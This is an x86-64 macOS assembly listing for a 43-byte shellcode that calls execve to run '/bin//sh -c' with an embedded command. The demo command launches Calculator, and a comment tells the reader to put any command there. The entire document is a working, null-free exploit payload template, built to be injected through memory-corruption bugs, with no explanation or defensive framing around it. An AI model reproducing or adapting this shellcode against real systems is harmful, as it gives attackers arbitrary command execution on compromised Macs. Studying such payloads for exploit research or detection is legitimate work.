; 43 bytes execute command
;
    bits    64

    push    59
    pop     rax         ; eax = sys_execve
    cdq                 ; edx = 0
    bts     eax, 25     ; eax = 0x0200003B
    mov     rbx, '/bin//sh'
    push    rdx         ; 0
    push    rbx         ; "/bin//sh"
    push    rsp
    pop     rdi         ; rdi="/bin//sh", 0
    ; ---------
    push    rdx         ; 0
    push    word '-c'
    push    rsp
    pop     rbx         ; rbx="-c", 0
    push    rdx         ; argv[3]=NULL
    jmp     l_cmd64
r_cmd64:                ; argv[2]=cmd
    push    rbx         ; argv[1]="-c"
    push    rdi         ; argv[0]="/bin//sh"
    push    rsp
    pop     rsi         ; rsi=argv
    syscall
l_cmd64:
    call    r_cmd64
	db "/System/Applications/Calculator.app/Contents/MacOS/Calculator" 
    ; put your command here followed by null terminator
